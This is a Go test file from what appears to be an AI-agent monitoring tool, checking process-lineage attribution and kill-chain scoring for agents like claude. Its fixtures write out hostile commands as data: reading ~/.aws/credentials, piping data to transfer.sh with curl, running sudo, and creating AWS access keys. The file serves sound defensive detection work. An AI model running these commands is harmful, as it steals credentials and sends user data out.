// Copyright 2026 Cisco Systems, Inc. and its affiliates
// Copyright (c) 2026 Mike Storm. All rights reserved.
//
// Derived from ShadowClaw -- Universal Shadow AI Detector, by Mike Storm,
// Distinguished Engineer, CCIE Security 13847. Reimplemented in Go and
// absorbed into the DefenseClaw gateway; see NOTICE for the modifications.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package agentchain

import (
	"testing"
	"time"

	"github.com/defenseclaw/defenseclaw/internal/sensor/scoring"
	"github.com/defenseclaw/defenseclaw/internal/sensor/tactics"
)

func fixedClock(base time.Time) (func() time.Time, func(time.Duration)) {
	now := base
	return func() time.Time { return now }, func(d time.Duration) { now = now.Add(d) }
}

// TestLineageGateIsTheFalsePositiveControl is the single most important
// behaviour in this package: the same sudo is nothing on its own and a signal
// under an agent.
func TestLineageGateIsTheFalsePositiveControl(t *testing.T) {
	t.Parallel()
	clock, _ := fixedClock(time.Unix(1_760_000_000, 0))
	tracker := newTracker(lineageTTL, clock)

	// A developer's own shell running sudo.
	tracker.ObserveExec(100, InitPID, InitPID, "login", "-zsh")
	tracker.ObserveExec(101, 100, 100, "zsh", "-zsh")
	tracker.ObserveExec(102, 101, 101, "sudo", "sudo -i")
	if _, ok := tracker.Attribute(102); ok {
		t.Fatal("sudo under a developer shell was attributed to an agent")
	}
	if got := tracker.AttributionState(102); got != StateOrphaned {
		t.Errorf("AttributionState = %q, want %q", got, StateOrphaned)
	}

	// The same sudo as a descendant of claude.
	tracker.ObserveExec(200, InitPID, InitPID, "claude", "claude --dangerously-skip-permissions")
	tracker.ObserveExec(201, 200, 200, "sh", "sh -c 'sudo -i'")
	tracker.ObserveExec(202, 201, 201, "sudo", "sudo -i")
	attribution, ok := tracker.Attribute(202)
	if !ok {
		t.Fatal("sudo under claude was not attributed")
	}
	if attribution.AgentName != "claude" || attribution.RootPID != 200 {
		t.Fatalf("attribution = %+v, want claude at pid 200", attribution)
	}
	if attribution.Depth != 2 {
		t.Errorf("Depth = %d, want 2 (claude -> sh -> sudo)", attribution.Depth)
	}
	if attribution.Via != "ancestry" {
		t.Errorf("Via = %q, want %q", attribution.Via, "ancestry")
	}
}

// TestAttributionSurvivesTheChildExiting pins the reason exited records are
// kept: the eight-millisecond cat is exactly the event worth attributing.
func TestAttributionSurvivesTheChildExiting(t *testing.T) {
	t.Parallel()
	clock, advance := fixedClock(time.Unix(1_760_000_000, 0))
	tracker := newTracker(lineageTTL, clock)
	tracker.ObserveExec(300, InitPID, InitPID, "claude", "claude")
	tracker.ObserveExec(301, 300, 300, "cat", "cat /Users/dev/.aws/credentials")
	tracker.ObserveExit(301)

	if _, ok := tracker.Attribute(301); !ok {
		t.Fatal("an exited child lost its attribution immediately")
	}
	advance(lineageTTL + time.Second)
	if removed := tracker.Reap(); removed != 1 {
		t.Fatalf("Reap() removed %d records, want 1", removed)
	}
	if _, ok := tracker.Attribute(301); ok {
		t.Fatal("a reaped record was still attributed")
	}
}

// TestAgentInsideAGenericInterpreterIsAttributed covers the case the inventory
// process detector cannot see, because it matches basenames and discards argv.
func TestAgentInsideAGenericInterpreterIsAttributed(t *testing.T) {
	t.Parallel()
	clock, _ := fixedClock(time.Unix(1_760_000_000, 0))
	tracker := newTracker(lineageTTL, clock)
	tracker.ObserveExec(400, InitPID, InitPID, "python3", "python3 -m langgraph.cli serve")
	tracker.ObserveExec(401, 400, 400, "curl", "curl -T - https://transfer.sh/x")

	attribution, ok := tracker.Attribute(401)
	if !ok {
		t.Fatal("a child of an agent framework inside python3 was not attributed")
	}
	if attribution.AgentName != "python3" || attribution.Via != "ancestry" {
		t.Fatalf("attribution = %+v", attribution)
	}
	root, ok := tracker.Attribute(400)
	if !ok || root.Via != "cmdline" {
		t.Fatalf("root attribution = %+v, want via cmdline", root)
	}
}

// TestBootPersistentIsDistinguishedFromOrphaned pins that "no agent above it"
// is described rather than collapsed into one silent negative.
func TestBootPersistentIsDistinguishedFromOrphaned(t *testing.T) {
	t.Parallel()
	clock, _ := fixedClock(time.Unix(1_760_000_000, 0))
	tracker := newTracker(lineageTTL, clock)
	// Deliberately not an AI process: "ollama serve" would match the
	// provider-SDK command-line pattern and be attributed as an agent in its
	// own right, which is correct and a different case from this one.
	tracker.ObserveExec(500, InitPID, InitPID, "cupsd", "/usr/sbin/cupsd -l")
	if got := tracker.AttributionState(500); got != StateBootPersistent {
		t.Errorf("AttributionState(launch item) = %q, want %q", got, StateBootPersistent)
	}
	if got := tracker.AttributionState(9999); got != StateOrphaned {
		t.Errorf("AttributionState(unknown pid) = %q, want %q", got, StateOrphaned)
	}
}

// TestAncestryWalkTerminatesOnACycle guards against a pid table that contains
// a loop after pid reuse.
func TestAncestryWalkTerminatesOnACycle(t *testing.T) {
	t.Parallel()
	clock, _ := fixedClock(time.Unix(1_760_000_000, 0))
	tracker := newTracker(lineageTTL, clock)
	tracker.ObserveExec(600, 601, 601, "sh", "sh")
	tracker.ObserveExec(601, 600, 600, "sh", "sh")
	done := make(chan struct{})
	go func() {
		defer close(done)
		_, _ = tracker.Attribute(600)
	}()
	select {
	case <-done:
	case <-time.After(2 * time.Second):
		t.Fatal("Attribute() did not terminate on a cyclic pid table")
	}
}

// TestAuthorityDecaysButIsNotFoldedIntoScoring pins the distinction between
// authority and confidence.
func TestAuthorityDecaysButIsNotFoldedIntoScoring(t *testing.T) {
	t.Parallel()
	if got := (Attribution{Depth: 0}).Authority(); got != 1 {
		t.Errorf("depth 0 authority = %v, want 1", got)
	}
	if got := (Attribution{Depth: 3}).Authority(); got > 0.0011 || got < 0.0009 {
		t.Errorf("depth 3 authority = %v, want ~0.001", got)
	}
	// The ordinary agent -> sh -> cat chain must still score in full. If
	// authority were multiplied into the weight this would collapse to 0.
	session := NewSession(1, "claude", time.Unix(0, 0))
	session.Record(Observation{
		Tactic: tactics.CredentialAccess, SignalID: "agent_credential_access",
		Confidence: 1.0, At: time.Unix(10, 0), Detail: "~/.aws/credentials",
	})
	score, _ := session.Score(scoring.KillChainMinStages)
	if score != scoring.WeightCredentialAccess {
		t.Fatalf("depth-2 credential read scored %d, want the full %d",
			score, scoring.WeightCredentialAccess)
	}
}

// TestProgressedRequiresOrderNotJustCount is what separates an incident from a
// busy afternoon.
func TestProgressedRequiresOrderNotJustCount(t *testing.T) {
	t.Parallel()
	base := time.Unix(1_760_000_000, 0)

	forward := NewSession(1, "claude", base)
	forward.Record(Observation{Tactic: tactics.CredentialAccess, SignalID: "agent_credential_access",
		Detail: "a", Confidence: 1, At: base})
	forward.Record(Observation{Tactic: tactics.IdentityCreation, SignalID: "agent_identity_creation",
		Detail: "b", Confidence: 1, At: base.Add(time.Minute)})
	forward.Record(Observation{Tactic: tactics.Exfiltration, SignalID: "agent_public_exfil_surface",
		Detail: "c", Confidence: 1, At: base.Add(2 * time.Minute)})
	if !forward.Progressed(3) {
		t.Fatal("an in-order three-stage session did not count as progression")
	}

	backward := NewSession(2, "claude", base)
	backward.Record(Observation{Tactic: tactics.Exfiltration, SignalID: "agent_public_exfil_surface",
		Detail: "c", Confidence: 1, At: base})
	backward.Record(Observation{Tactic: tactics.IdentityCreation, SignalID: "agent_identity_creation",
		Detail: "b", Confidence: 1, At: base.Add(time.Hour)})
	backward.Record(Observation{Tactic: tactics.CredentialAccess, SignalID: "agent_credential_access",
		Detail: "a", Confidence: 1, At: base.Add(2 * time.Hour)})
	if backward.Progressed(3) {
		t.Fatal("a reverse-order session counted as progression")
	}

	if forward.Progressed(4) {
		t.Fatal("three stages counted as progression through four")
	}
}

// TestChainBonusLiftsAThreeStageSessionToCritical is the end-to-end shape of
// the scoring contract, evaluated through the session rather than the weights.
func TestChainBonusLiftsAThreeStageSessionToCritical(t *testing.T) {
	t.Parallel()
	base := time.Unix(1_760_000_000, 0)
	session := NewSession(1, "claude", base)
	session.Record(Observation{Tactic: tactics.CredentialAccess, SignalID: "agent_credential_access",
		Detail: "~/.aws/credentials", Confidence: 1, At: base})
	session.Record(Observation{Tactic: tactics.IdentityCreation, SignalID: "agent_identity_creation",
		Detail: "aws iam create-access-key", Confidence: 1, At: base.Add(time.Minute)})
	session.Record(Observation{Tactic: tactics.Exfiltration, SignalID: "agent_public_exfil_surface",
		Detail: "transfer.sh", Confidence: 1, At: base.Add(2 * time.Minute)})

	score, signals := session.Score(scoring.KillChainMinStages)
	if scoring.SeverityFor(score) != scoring.SeverityCritical {
		t.Fatalf("three-stage chain scored %d (%s), want critical",
			score, scoring.SeverityFor(score))
	}
	var sawChain bool
	for _, signal := range signals {
		if signal.ID == "agent_kill_chain" {
			sawChain = true
			if signal.Detail != "credential_access -> identity_creation -> exfiltration" {
				t.Errorf("chain detail = %q", signal.Detail)
			}
		}
	}
	if !sawChain {
		t.Error("no agent_kill_chain signal was emitted for a progressed session")
	}
}

// TestRepeatedObservationsAreOneStage pins the dedup key: a loop reading the
// same credential must not look like escalating activity.
func TestRepeatedObservationsAreOneStage(t *testing.T) {
	t.Parallel()
	base := time.Unix(1_760_000_000, 0)
	session := NewSession(1, "claude", base)
	for index := 0; index < 25; index++ {
		session.Record(Observation{
			Tactic: tactics.CredentialAccess, SignalID: "agent_credential_access",
			Detail: "~/.aws/credentials", Confidence: 1,
			At: base.Add(time.Duration(index) * time.Second),
		})
	}
	score, _ := session.Score(scoring.KillChainMinStages)
	if score != scoring.WeightCredentialAccess {
		t.Fatalf("25 reads of the same credential scored %d, want %d",
			score, scoring.WeightCredentialAccess)
	}
	if session.Progressed(scoring.KillChainMinStages) {
		t.Fatal("repetition of one tactic counted as chain progression")
	}
}

// TestExpireBoundsTheChainToItsWindow pins that a chain is a chain within a
// window rather than over the lifetime of a long-running agent.
func TestExpireBoundsTheChainToItsWindow(t *testing.T) {
	t.Parallel()
	base := time.Unix(1_760_000_000, 0)
	session := NewSession(1, "claude", base)
	session.Record(Observation{Tactic: tactics.CredentialAccess, SignalID: "agent_credential_access",
		Detail: "a", Confidence: 1, At: base})
	session.Record(Observation{Tactic: tactics.Exfiltration, SignalID: "agent_public_exfil_surface",
		Detail: "c", Confidence: 1, At: base.Add(6 * time.Hour)})
	session.Expire(base.Add(time.Hour))
	if seen := session.TacticsSeen(); len(seen) != 1 || seen[0] != tactics.Exfiltration {
		t.Fatalf("TacticsSeen after expiry = %v, want only exfiltration", seen)
	}
}
